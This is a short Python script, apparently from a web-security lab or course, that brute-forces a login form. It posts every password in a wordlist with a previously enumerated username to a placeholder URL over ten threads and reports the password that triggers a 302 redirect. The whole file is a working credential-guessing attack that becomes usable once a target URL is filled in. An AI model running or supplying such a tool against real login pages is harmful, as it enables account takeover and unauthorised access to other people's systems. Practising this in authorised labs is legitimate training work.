import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://YOUR-LINK/login"
wordlist_path = "authentication/wordlist/passwords.txt"
# TODO: UPDATE the value obtained from prior enumeration phase
known_username = "dummy_username"

with open(wordlist_path) as wordlist_file:
    passwords = wordlist_file.read().splitlines()

print(f"[*] Username: {known_username}")
print(f"[*] Total Passwords to Test: {len(passwords)}")
print("[*] Starting Password Brute Force...\n")

num_of_workers = 10
found = False

def check_password(password):
    data = {
        "username": known_username,
        "password": password
    }
    post_response = requests.post(url, data=data, allow_redirects=False)
    return password, post_response.status_code

with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
    futures = {executor.submit(check_password, password): password for password in passwords}
    for future in as_completed(futures):
        password, status_code = future.result()
        print(f"Password: {password:<30} | Status Code: {status_code}")
        # 302 indicates a successful auth — server redirects on valid credentials
        if status_code == 302:
            print("\n[+] Valid Password Found!")
            print(f"[+] Username: {known_username}")
            print(f"[+] Password: {password}")
            found = True
            # Cancel pending futures — no point continuing after a hit
            executor.shutdown(wait=False)
            break

if not found:
    print("\n[-] Password not found in wordlist")